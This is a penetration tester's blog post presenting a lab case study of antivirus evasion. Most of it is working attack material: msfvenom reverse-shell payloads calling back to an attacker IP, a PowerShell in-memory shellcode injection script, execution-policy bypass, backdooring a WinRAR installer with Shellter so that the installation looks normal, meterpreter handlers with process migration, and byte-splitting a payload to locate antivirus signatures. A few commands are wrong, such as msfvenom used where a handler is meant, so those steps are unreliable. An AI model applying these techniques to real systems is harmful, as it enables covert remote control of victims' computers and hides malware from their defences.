<!doctype html>
<html lang="en-us">
  <head>
    <title>Case Study - Antivirus Evasion // FMisi&#39;s security.log</title>
    <link rel="shortcut icon" href="../favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.105.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="FMisi" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="../../stiluslapom.css" />
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Case Study - Antivirus Evasion"/>

    <meta property="og:title" content="Case Study - Antivirus Evasion" />
<meta property="og:type" content="article" />
<meta property="og:url" content="Case Study - Antivirus Evasion" /><meta property="article:section" content="case-studies" />
<meta property="article:published_time" content="2022-07-13T23:18:05+13:00" />
<meta property="article:modified_time" content="2022-07-13T23:18:05+13:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://fmisi.github.io/"><img class="app-header-avatar" src="../../avatar.jpg" alt="FMisi" /></a>
      <span class="app-header-title">FMisi</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="../../index.html">/root</a>
             - 
          
          <a class="app-header-menu-item" href="../../htb/index.html">/htb</a>
             - 
          
		  <a class="app-header-menu-item" href="../../case-studies/index.html">/case-studies</a>
             - 
		  
          <a class="app-header-menu-item" href="../../notes/index.html">/notes</a>
      </nav>
      <p>FMisi is a penetration tester.</p><br/>
      <a style="font-size: smaller;" href="../../../privacy/index.html">Privacy Policy</a><br/>
    </header>
    <main class="app-container">

  <article class="post">
    <header class="post-header">
      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="fmisi" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
      <script src="/js/crypto-js.min.js"></script>
      <script src="/js/dice.js"></script>
      <h1 class ="post-title">Case Studies - Antivirus Evasion</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Sept 24, 2023
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          50 min read
        </div>
      </div>
    </header>
<div class="post-content">
<h3 id="intro">Intro</h3>
In this blog post, we will delve into the intriguing world of antivirus evasion techniques, exploring the various ways in which malicious actors attempt to outmaneuver security software.<br/>From the ingenious obfuscation of malicious code to polymorphic malware that shape-shifts with each attack, we will uncover the dark arts that threat actors employ to bypass even the most resilient antivirus defenses.<br/>
However, this blog post is not meant to serve as a guidebook for aspiring hackers; quite the contrary.<br/>Our primary focus will be to shine a light on these stealthy strategies so that both security professionals and ordinary users can better understand the threats they face.<br/>With knowledge comes power, and by comprehending the tactics, we can fortify our defenses and develop effective mitigation solutions to safeguard our digital realm.<br/>
<br/>
<h3 id="aebg">Background</h3>
<img src="lab.png" width="75%" height="50%" alt="lab.png"><br/><br/>
<b>The real time protection of the antivirus/antiviruses we test against is turned ON unless stated otherwise.<br/>
Both machines have nc.exe installed.<br/>
Both machines have Microsoft Office 2016 installed.<br/>
Both machines have Process Explorer installed.<br/>
Both systems are x86 (32 bit) systems.<br/>
Both systems have a "lab" user with restricted privileges and an "admin" user with Administrator privileges.<br/>
Our Attacker machine has the FlexHEX hex editor preinstalled on it's Windows 10 part.</b>
<br/>
<h3 id="verybasicae_whatisa">What is Antivirus Software?</h3>
Antivirus is a type of application designed to prevent, detect, and remove malicious software.<br/>
It was originally designed to simply remove computer viruses.<br/>
However, with the development of other types of malware, antivirus softwares now typicly include additional protections, such as firewalls, application scanners, and more.<br/>
<br/>
<h3 id="verybasicae_dm">Detection Methods</h3>
There are multiple methods that antivirus manufacturers utilize to detect malicious software.<br/>
The most common methods used are: signature-based detection, heuristic-based detection, and behavior-based detection.<br/><br/>
<b>Signature-based detection</b>: Signature-based antivirus detection is mostly considered a blacklist technology. In other words,
the filesystem is scanned for known malware signatures and if any are detected, the offending
files are quarantined. This implies that, with correct tools, we can bypass antivirus software that
relies on this detection method fairly easily. Specifically, we can bypass signature-based detection
by simply changing or obfuscating the contents of a known malicious file in order to break the
identifying byte sequence (or signature).<br/><br/>
<b>Heuristic-Based Detection</b>: Heuristic-Based detection is a detection method that relies on various rules and algorithms to
determine whether or not an action is considered malicious. This is often achieved by stepping
through the instruction set of a binary file or by attempting to decompile and then analyze the
source code. The idea is to look for various patterns and program calls (as opposed to simple.
byte sequences) that are considered malicious.<br/><br/>
<b>Behavior-Based Detection</b>: Behavior-Based detection dynamically analyzes the behavior of a binary file. This
is often achieved by executing the file in question in an emulated environment, such as a small
virtual machine, and looking for behaviors or actions that are considered malicious.<br/><br/>
It is important to note that the majority of antivirus developers use a combination of these detection
methods to achieve higher detection rates.<br/>
<br/>
<h3 id="verybasicae_em">Evasion Methods</h3>
Generally speaking, antivirus evasion falls into two broad categories: on-disk and in-memory.<br/><b>On-disk evasion</b> focuses on modifying malicious files physically stored on disk in an attempt to evade
AV detection.<br/>Given the maturity of AV file scanning, modern malware often attempts <b>in-memory
evasion</b>, avoiding the disk entirely.<br/>
<br/>
<h4 id="verybasicae_od">On-disk Evasion</h4>
To begin our discussion of evasion, we will first look at various techniques used to obfuscate files
stored on a physical disk.<br/>
<ul>
<li><b>Packers</b>: Modern on-disk malware obfuscation can take many forms.<br/>One of the earliest ways of avoiding
detection involved the use of packers.<br/> Given the high cost of disk space and slow network
speeds during the early days of the Internet, packers were originally designed to simply reduce
the size of an executable.<br/>Unlike modern "zip" compression techniques, packers generate an
executable that is not only smaller, but is also functionally equivalent with a completely new
binary structure.<br/>The resultant file has a new signature and as a result, can effectively bypass
older and more simplistic AV scanners.<br/>Even though some modern malware uses a variation of
this technique, the use of UPX and other popular packers alone is not sufficient for evasion of
modern AV scanners.</li><br/>
<li><b>Obfuscators</b>: Obfuscators reorganize and mutate code in a way that makes it more difficult to reverse-
engineer.<br/>This includes replacing instructions with semantically equivalent ones, inserting
irrelevant instructions or "dead code", splitting or reordering functions, and so on.<br/>Although
primarily used by software developers to protect their intellectual property, this technique also can be
effective against signature-based AV detection.</li><br/>
<li><b>Crypters</b>: A crypter software cryptographically alters executable code, adding a decrypting stub that
restores the original code upon execution.<br/>This decryption happens in-memory, leaving only the
encrypted code on-disk. Encryption has become foundational in modern malware as one of the
most effective AV evasion techniques.</li><br/>
<li><b>Software Protectors</b>: Highly effective antivirus evasion requires a combination of all of the previous techniques in
addition to other advanced ones, including anti-reversing, anti-debugging, virtual machine
emulation detection, and so on.<br/>In most cases, software protectors were designed for legitimate
purposes but can also be used to bypass AV detection.<br/>
Most of these techniques may appear simple at a high-level but they are actually quite complex.<br/>
Because of this, there are currently few actively-maintained free tools that provide acceptable
antivirus evasion.<br/>Among commercially available tools, The Enigma Protector in particular can
successfully be used to bypass antivirus products. However, it is not always the case.<br/>
You can also utilize it for <a href="https://www.cybrary.it/blog/advanced-exe-multi-protection-reverse-engineering-free-tools">advanced EXE multi rotection against reverse engineering</a>.
</li><br/>
</ul>
<h4 id="verybasicae_im">In-memory Evasion</h4>
In-Memory Injections, also known as PE Injection is a popular technique used to bypass
antivirus products. Rather than obfuscating a malicious binary, creating new sections, or
changing existing permissions, this technique instead focuses on the manipulation of volatile
memory.<br/>One of the main benefits of this technique is that it does not write any files to disk,
which is one the main areas of focus for most antivirus products.<br/>
There are several evasion techniques that do not write files to disk.<br/>
I will cover in-memory injection using PowerShell in detail and
cover the others too which rely on low level programming background in languages such as C/C++.<br/><br/>
<ul>
<li><b>Remote Process Memory Injection</b>: This technique attempts to inject the payload into another valid PE that is not malicious. The
  most common method of doing this is by leveraging a set of Windows APIs.<br/>First, we would
  use the OpenProcess function to obtain a valid HANDLE to a target process that we have
  permissions to access.<br/>After obtaining the HANDLE, we would allocate memory in the context of
  that process by calling a Windows API such as VirtualAllocEx.<br/>Once the memory has been
  allocated in the remote process, we would copy the malicious payload to the newly allocated
  memory using WriteProcessMemory.<br/>After the payload has been successfully copied, it is
  usually executed in memory in a separate thread using the CreateRemoteThread API.<br/>
  This sounds complex, but we will use a similar technique in the following example, using
  PowerShell to do most of the heavy lifting and perform a very similar but simplified attack
  targeting a local powershell.exe instance.</li><br/>
<li><b>Reflective DLL Injection</b>: Unlike regular DLL injection, which implies loading a malicious DLL from disk using the
  LoadLibrary API, this technique attempts to load a DLL stored by the attacker in the process
  memory.
  The main challenge of implementing this technique is that LoadLibrary does not support loading a
  DLL from memory. Furthermore, the Windows operating system does not expose any APIs that can handle this either. Attackers who choose to use this technique must write their own version
  of the API that does not rely on a disk-based DLL.</li><br/>
<li><b>Process Hollowing</b>: When using process hollowing to bypass antivirus software, attackers first launch a non-
  malicious process in a suspended state.<br/>Once launched, the image of the process is removed
  from memory and replaced with a malicious executable image.<br/>Finally, the process is then
  resumed and malicious code is executed instead of the legitimate process.</li><br/>
<li><b>Inline hooking</b>: As the name suggests, this technique involves modifying memory and introducing a hook
  (instructions that redirect the code execution) into a function to point the execution flow to our
  malicious code.<br/>Upon executing our malicious code, the flow will return back to the modified
  function and resume execution, appearing as if only the original code had executed.
</li><br/>
</ul>
<h3 id="verybasicae_prace">AV Evasion: Practical Example</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.100 LPORT=4444 -f exe > binary.exe<br/>[...]<br/>#</span>
</code></div>
Uploading the binary.exe file to <a href="https://www.virustotal.com/gui/home/upload">virustotal.com</a> we see that a lot of antivirus vendors detected the file as malicious.<br/><br/>
<img src="vt.png" height="40%" width="75%" alt="vt.png"><br/><br/>
VirusTotal is convenient but it generates a hash for each unique submission, which is then shared with all participating AV vendors.<br/>
We will see that we can use <a href="https://antiscan.me">AntiScan.Me</a> instead.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># rdesktop 10.11.0.22 -u lab -p lab -g 1024x768 -x 0x80</span>
</code></div>
Here, -x changes default bandwidth performance behaviour for RDP5. By default only theming is enabled, and all other options are disabled (corresponding to modem (56 Kbps)). Setting experience to b[roadband] enables menu animations and full window dragging. Setting experience to l[an] will also enable the desktop wallpaper. Setting experience to m[odem] disables all (including themes). Experience can also be a hexidecimal number containing the flags.<br/><br/>
We set up a netcat listener on the Windows target.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span><span>&gt; nc -lvnp 4455 &gt; C:\Users\lab\Desktop\binary.exe</span>
</code></div>
We set up netcat on our Kali machine to send the binary.exe file - previously generated with msfvenom - to the Windows target.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># nc -w 3 10.11.0.22 4455 &lt; binary.exe</span>
</code></div><br/>
<h4 id="iwontgiveitanid">PowerShell In-Memory Injection</h4>
Below, we see a basic template script that performs in-memory injection:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';


$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = &lt;place your shellcode here&gt;;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</span>
</code></div><br/>
The script sets the size of the allocated memory block ($size) to 0x1000 (4096 bytes) if the shellcode length is greater than 4096 bytes. While this ensures that the memory allocation is sufficient to hold the shellcode, it doesn't take into account cases where the shellcode length is smaller than 4096 bytes. If the shellcode is smaller, there will be unused memory, which is not efficient. Instead, we can directly use the length of the shellcode to determine the size of the memory allocation:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$sc = &lt;place your shellcode here&gt;;<br/>$size = $sc.Length;</span></code></div>
The script lacks error handling, which might lead to issues if, for example, the memory allocation fails or if the shellcode contains invalid characters for the memory operations.<br/>
We can modify the template script to correct these issues, but it is not necessary as these are not critical issues and it will do the job anyway.<br/><br/>
The script starts by importing VirtualAlloc428 and CreateThread429 from kernel32.dll as well as
memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution
thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we
are allocating the memory and executing a new thread in the current process (powershell.exe),
rather than a remote one.<br/><br/>
The script then allocates a block of memory using VirtualAlloc, takes each byte of the payload
stored in the $sc byte array, and writes it to our newly allocated memory block using memset.<br/><br/>
As a final step, our in-memory written payload is executed in a separate thread using
CreateThread.<br/><br/>
We generate a shellcode with msfvenom:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.100 LPORT=4444 -f powershell<br/>[...]<br/>[byte[]] $buf = 0xfc, 0xe8, 0x82, [...]</span>
</code></div>
Then copy the resulting output into the script.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';


$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = 0xfc, 0xe8, 0x82, [...];

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</span></code></div><br/>

We save our script with as av_test.ps1.<br/>
Uploading it to VirusTotal.com reveals that only 6 antivirus flag our script as malicious, and Avira is not one of them.<br/>
Let's scan the file with Avira on the targeted Windows machine.<br/><br/>
<img src="avirascanres.png" hegiht="80" width="70%" alt="avirascanres.png">
<br/><br/>
Nice! Our powershell script did not trigger any warnings.
If we attempt to run our powershell script with the<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; powershell .\av_test.ps1</span>
</code></div>
command, we notice that the execution policy prevents us from executing our script.<br/>
This is because powershell execution policies are set on a per user, rather than a per system basis.<br/>
We can: attempt to change the execution policy OR attempt to bypass the execution policy on a per script basis with the
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span> -ExecutionPolicy Bypass</span>
</code></div>
flag.<br/><br/>
Keep in mind that much like anything in Windows, the PowerShell Execution
Policy settings can be dictated by one or more Active Directory GPOs. In those
cases it may be necessary to look for additional bypass vectors.<br/><br/>
Let's attempt to view and change the current policy for our user.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Get-ExecutionPolicy -Scope CurrentUser<br/>Undefined<br/>&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser<br/>&gt; Get-ExecutionPolicy -Scope CurrentUser<br/>Unrestricted</span>
</code></div>
Before executing our script, we start a meterpreter handler on our Kali attack machine to interact with our shell.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfvenom -x "use exploit/multi/handler; set RHOST 10.11.0.22; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.11.0.100"  </span>
</code></div>
Typing in
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; show options  </span>
</code></div>
we can see everything is alright and the LPORT is 4444.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; exploit  </span>
</code></div>
Let's launch our powershell script on the targeted Windows machine!<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; .\av_test.ps1</span>
</code></div>
The script executes without any problems...
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span><u>meterpreter</u> &gt; getuid  <br/>Server username: WIN10-x86\lab</span>
</code></div>
and we receive a meterpreter shell on our attack machine.<br/>
Excellent!<br/>
We have successfully evaded Avira's detection on our target.<br/>
<h4 id="shellter">Shellter</h4>
Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of
bypassing antivirus software. It uses a number of novel and advanced techniques to essentially
backdoor a valid and non-malicious executable file with a malicious shellcode payload.<br/>
it essentially
performs a thorough analysis of the target PE (portable executable) file and the execution paths. It then determines where
it can inject our shellcode, without relying on traditional injection techniques that are easily caught
by AV engines. Those include changing of PE file section permissions, creating new sections, and
so on.
Finally, Shellter attempts to use the existing PE Import Address Table (IAT) entries to locate
functions that will be used for the memory allocation, transfer, and execution of our payload.<br/>
Not to be confused with the Virtual Function Table (VFT).<br/>
We need a legitimate software to which we can inject our malicious payload.<br/>
WinRAR will be good for this purpose.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo apt install shellter && sudo apt install wine</span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo shellter</span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> A  </span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> /home/kali/winrar-x32-623.exe  </span>
</code></div>
As soon as Shellter finds a suitable place for our shellcode it will ask us if we want to enable stealth mode, which will try to restore the execution flow after executing our payload. We will enable this, allowing our winrar installation to complete normally, which could reduce user suspicion.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> Y  </span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]<br/>[1] Meterpreter_Reverse_TCP [stager]<br/>[...]<br/> L</span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> 1  </span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>SET LHOST: 10.11.0.100  </span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>SET LPORT: 4444  </span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]<br/>Injection: Verified!<br/>Press [Enter] to continue...  </span>
</code></div>
We configure a listener on our Kali machine to interact with the meterpreter payload and transfer our PE with netcat.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfvenom -x "use exploit/multi/handler; set RHOST 10.11.0.22; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.11.0.100; exploit"  </span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; nc.exe -lvnp 4455 &gt; C:\Users\lab\Dekstop\winrar-x32-623.exe  </span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span># nc -lvnp 4455 &gt; C:\Users\lab\Dekstop\winrar-x32-623.exe  </span>
</code></div>
Let's scan our WinRAR with Avira.<br/><br/>
<img src="avirascanres.png" hegiht="80" width="70%" alt="avirascanres.png">
<br/><br/>
Since Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE, the Avira scan runs cleanly.<br/>
Once we execute the file, we are presented with the default WinRAR installation window.<br/>
We install WinRAR.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span><u>meterpreter</u> &gt;<br/>[*] 10.11.0.22 - Meterpreter session 1 closed. Reason: Died</span>
</code></div>
Looking back at our handler shows that we
successfully received a Meterpreter session but the session appears to die after the installation
either finishes or is cancelled.<br/>
This makes sense because the installer execution has completed and the process has been
terminated.<br/>In order to overcome this problem, we can set up an AutoRunScript to migrate our
Meterpreter to a separate process immediately after session creation.<br/>If we re-run the WinRAR
setup file after this change to our listener instance, we should receive a different result.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; set AutoRunScript post/windows/manage/migrate<br/>AutoRunScript => post/windows/manage/migrate<br/><br/>&gt; exploit<br/>[...]<br/>[*] Spawning notepad.exe process to migrate to<br/>[+] Migrating to 4832<br/>[+] Successfully migrated to process 4832</span>
</code></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span><u>meterpreter</u> &gt; getuid  <br/>Server username: WIN10-x86\lab</span>
</code></div>
After the migration completes, the session will remain active even after we complete the WinRAR
installation process or cancel it.

<!--END of very-very basic stuff-->

<h3 id="interav">Intermediate Antivirus Evasion</h3>
To begin, let's discuss the process of bypassing antivirus signature detection.<br/><br/>
<b>For this exercise, we must disable the heuristics-based scanning portion of the antivirus engine.
In this section, we are going to rely on ClamAV for scanning, which is preinstalled on the targeted Windows 10 victim
machine and has it's heuristics engine disabled.</b><br/><br/>
Before starting our analysis, we'll launch the Avira Free Antivirus GUI and open the Antivirus pane.
In the new window, we'll click Real-Time Protection and switch it "off".<br/><br/>
<img src="aviradisablerealtime.png" height="80%" width="75%" alt="aviradisablerealtime.png"><br/><br/>
For this example, we'll generate a 32-bit Meterpreter executable and copy it to the C:\Tools folder
on our Windows 10 victim machine. This will serve as our malicious binary.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.100 LPORT=4444 -f exe &gt; ./met.exe</span>
</code></div>
Next, we'll open a PowerShell prompt with the -ExecutionPolicy Bypass argument, navigate to the C:\Tools<br/>
directory, and import the Find-AVSignature script as follows:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; powershell -ExecutionPolicy Bypass<br/>&gt; cd C:\Tools<br/>&gt; Import-Module .\Find-AVSignature.ps1</span>
</code></div>
Let's use Find-AVSignature to split the met.exe file into intervals.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force<br/><br/>[...]<br/>
VERBOSE: Byte 0 -> 0
VERBOSE: Byte 0 -> 10000
VERBOSE: Byte 0 -> 20000
VERBOSE: Byte 0 -> 30000
VERBOSE: Byte 0 -> 40000
VERBOSE: Byte 0 -> 50000
VERBOSE: Byte 0 -> 60000
VERBOSE: Byte 0 -> 70000
VERBOSE: Byte 0 -> 73801
Files written to disk. Flushing memory.
Completed!</span>
</code></div>
We'll open a new administrative PowerShell prompt and navigate to the C:\Program Files\ClamAV folder.<br/>
From here, we'll launch the clamscan.exe executable, running the scan against the segments in<br/>
the C:\Tools\avtest1 folder<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; cd 'C:\Program Files\ClamAV\'<br/>&gt; .\clamscan.exe C:\Tools\avtest1
C:\Tools\avtest1\met_0.bin: OK
C:\Tools\avtest1\met_10000.bin: OK
C:\Tools\avtest1\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_30000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_40000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_50000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_60000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_70000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_73801.bin: Win.Trojan.MSShellcode-7 FOUND
[...]</span>
</code></div>
The first file passes detection. This is no surprise, since it is empty. The second file, which
contains the first 10000 bytes of our binary, is clean as well. This means that the first signature
was detected in the third file, somewhere between offset 10000 and 20000.<br/><br/>
It is important to note that offsets and number of detections found may vary for each generation of a Meterpreter executable.<br/><br/>
We'll run Find-AVSignature again to split the Meterpreter executable with 1000 byte intervals,<br/>but only from offset 10000 to 20000.<br/>
